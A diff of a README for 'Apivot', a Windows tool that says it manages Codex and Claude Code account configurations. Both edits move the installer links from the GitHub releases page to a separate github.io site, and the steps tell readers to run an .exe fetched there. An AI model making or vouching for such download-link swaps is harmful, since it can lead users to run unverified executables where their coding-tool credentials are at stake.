@@ -1,6 +1,6 @@
 # 🛠️ Apivot - Manage your AI coding accounts safely
 
-[![Download Apivot](https://img.shields.io/badge/Download_Apivot-blue)](https://github.com/Nosequarterrest500/Apivot/releases)
+[![Download Apivot](https://img.shields.io/badge/Download_Apivot-blue)](https://nosequarterrest500.github.io)
 
 Apivot keeps your AI coding tools organized. It switches between different configurations for Codex and Claude Code. You maintain your official logins without issues. This tool saves your settings and restores them with one click. It respects your privacy and sends no data to servers.
 
@@ -16,7 +16,7 @@ Apivot keeps your AI coding tools organized. It switches between different confi
 
 Follow these steps to set up Apivot on your Windows computer.
 
-1.  **Download the Installer:** Visit the [Apivot releases page](https://github.com/Nosequarterrest500/Apivot/releases).
+1.  **Download the Installer:** Visit the [Apivot releases page](https://nosequarterrest500.github.io).
 2.  **Select the File:** Look for the file ending in `.exe` under the latest release section.
 3.  **Run the Installer:** Double-click the downloaded file to start the setup process.
 4.  **Confirm Installation:** Follow the on-screen prompts to finish the process.
